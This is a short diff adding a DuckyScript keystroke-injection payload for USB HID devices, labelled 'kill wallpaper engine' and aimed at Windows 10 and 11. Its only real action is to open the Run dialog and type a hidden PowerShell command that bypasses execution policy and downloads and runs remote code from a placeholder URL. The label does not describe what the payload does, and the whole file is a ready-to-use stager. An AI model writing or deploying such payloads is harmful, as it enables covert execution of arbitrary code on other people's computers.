@@ -1,1 +1,8 @@
-REM intial commit
+REM kill wallpaper engine
+
+REM Mode: HID
+REM Target: Windows 10,11
+
+GUI r
+DELAY 250
+STRING powershell -w h -NoP -Ep Bypass -Command "irm 'urlHere' | iex"
